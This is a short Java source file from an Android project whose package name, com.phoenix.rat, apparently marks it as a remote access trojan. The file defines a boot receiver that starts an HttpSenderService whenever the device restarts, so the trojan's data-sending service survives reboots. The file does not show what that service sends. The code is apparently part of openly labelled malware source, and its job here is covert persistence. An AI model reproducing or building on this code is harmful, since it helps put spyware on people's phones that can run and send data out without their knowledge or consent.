package com.phoenix.rat.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.phoenix.rat.enums.ServiceState;
import com.phoenix.rat.services.HttpSenderService;

public class BootEventReceiver extends BroadcastReceiver {
    public BootEventReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (HttpSenderService.STATE == ServiceState.NOT_RUNNING){
            context.startService(new Intent(context, HttpSenderService.class));
        }
    }
}
